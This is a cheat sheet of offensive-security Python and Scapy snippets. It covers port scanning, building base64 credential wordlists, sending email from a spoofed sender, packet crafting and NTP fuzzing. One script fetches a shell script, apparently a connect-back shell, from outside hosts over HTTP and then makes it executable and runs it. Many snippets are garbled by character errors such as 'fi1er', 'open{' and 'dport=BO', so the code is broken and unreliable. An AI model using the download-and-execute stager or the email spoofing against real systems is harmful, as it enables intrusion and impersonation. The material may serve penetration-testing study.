# Python

### Python - Port Scanner
```python
import socket as sk
for port in range (1, 1024):
    try:
        s=sk. socket ( sk .AF_INET, sk. SOCK_STREAM)
        s.settimeout(1000)
        s. connect ( (' 127. 0. 0. 1 ' , port) )
        print '%d:OPEN' % (port)
        s.close
    except: continue 
```


### Python - Generating base64 words
```python
#!/usr/bin/pjthon
import base64
filel=open("pwd.lst","r")
file2=open("b64pwds.lst","w")
for line in file1:
    clear= "administrator:"+ str.strip(line)
    new= base64.encodestring(clear)
    file2.write(new)
```

### Python - Convert Windows registry from hex to ascii
```python
import binascii, sys, string
dataFormatHex = binascii.a2b_hex(sys.argv[1])
output = ""
for char in dataFormatEex:
    if char in string.printable: output += char
    else: output += "."
print ''\n'' + output
```


### Python - Reading all folder files and searching with regex
```python
import glob, re
for msg in glob.glob('/tmp/.txt'):
    filer = open ((msg), 'r')
    data = fi1er.read()
    message= re.findall(r' message (.'?) /message ', data, re.DOTALL)
    print "File %s contains %s" % (str(msg) ,message)
    fi1er.c1ose()
```

### Python - Building a web server encrypted with ssl
```python
# Create SSL cert (follow prompts for customization)
  openssl req -new -x509 -keyout cert.pem -out cert.pern -days 365 -nodes

#Create httpserver.pj
  import BaseHTTPServer,SimpleHTTPServer,ssl

cert ="cert.pem"
httpd = BaseHTTPServer.HTTPServer( ('192.168.1.10' ,443),
Simp1eHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap socket(httpd.socket,certflle=cert,server side=True)
httpd.serve_forever()
```

### Python - Web Server on port 8888
```python
python3 -m  http.server 8888
```


### Python - Send email (sendmail must be installed)
```python
#!/usr/bin/python
import smtplib, string
import os, time

os.system("/etc/init.d/sendmail start")
time.sleep(4)

    HOST = "localhost"
    SUBJECT = "Email from spoofed sender"
    TO = "target@you.com"
    FROM= "spoof@spoof.com"
    TEXT = "Message Body"
    BODY = string.join( (
            "From: %s" % FROH,
            "To: %s" % TO,
            "Subject: %s" % SUBJECT ,
            "",
            TEXT
            ) , "\r\n")
server = smtplib.SMTP(HOST)
server.sendmail(FROM, [TO], BODY)
server. quit ()
time.sleep(4)
os.system("/etc/init.d/sendmail stop")
```


### Python - Get the file from http and run it
```python
#!/usr/bin/python
import urllib2, os

urls = [ "1 1.1.1.1","2.2.2.2"]
port = "80"
payload = "cb.sh"

for url in urls:
    u = "http://%s:%s/%s" % (url, port, payload)
    try:
        r = urllib2.urlopen(u)
        wfile = open{"/tmp/cb.sh", "wb")
        wfile.write(r.read())
        wfile. close ()
        break
    except: continue

if os.path.exists("/tmp/cb.sh"):
    os.system("chmod 700 /tmp/cb.sh")
    os. system ( "/tmp/cb. sh")
```


## Scapy
When you craft TCP packets with Scapy, the underlying OS will not recognize the initial SYN packet and will reply with a RST packet. To mitigate this you need to set the following Iptables rule: 

`iptables -A OUTPUT -p tcp –tcp-flags RST RST -j DROP`

```text
from scapy.all import * --> Load all scapy libraries
ls () --> List of all protocols
lsc () --> List of all functions
conf --> Display and settings
IP(src=RandiP()) --> Generate random destination IP
Ether(src=RandMAC() I	--> Generate random destination MAC
ip=IP(src=”1.1.1.1”,dst=”2.2.2.2”)	--> Change the ip parameter
tcp=TCP(dport=”443”)	--> Change the tcp parameter
data= “TCP data”	--> Specify the data part
packet=ip/tcp/data	--> Create ip and tcp packet
packet.show()	--> Show package settings
send(packet,count=1)	--> Send 1 packet to layer 3
sendp(packet,count=2)	--> Send 2 packets to layer 3
sendpfast(packet)	--> Send faster with tcpreply
sr(packet)	--> Send 1 package and get the result
sr1(packet)	--> Post only one reply
for i in range(0,1000): send (packet·)	--> Sending a set a thousand times
sniff(count=100,iface=eth0)	--> Listening for hundred packets on eth0
```


### Send icmp message on ipv6
```python
sr ( IPv6 ( src=" ipv6 ", dst="ipv6")/ ICMP ())
```

### udp packet and payload
```python
ip=IP(src="ip", dst="ip")
u=UDP(dport=1234, sport=5678)
pay = "my UDP packet"
packet=ip/u/pay
packet.show( )
wrpcap ("out.pcap",packet) :write to pcap
send(packet)
```

### Ntp fuzzer operation
```python
packet=IP(src="ip" ,dst=" ip ")/UDP(dport=l23)/fuzz(NTP(version=4,mode=4))
```

### Send http message
```python
from scapy.all import *
# Add iptables rule to block attack box from sending RSTs
# Create web.txt with entire GET/POST packet data
fileweb = open("web.txt",'r')
data = fileweb.read()
ip = IP(dst="ip")
SYN=ip/TCP(rport=RandNum(6000,7000),dport=BO,flags="S",seq=4)
SYNACK = sr1(SYN)
ACK=ip/TCP(sport=SYNACK.dport,dport=BO,flags="A",seq=SYNACK.ack,ack=SYNACK.
seq+l)/data
reply,error = sr(ACK)
print reply.show()
```
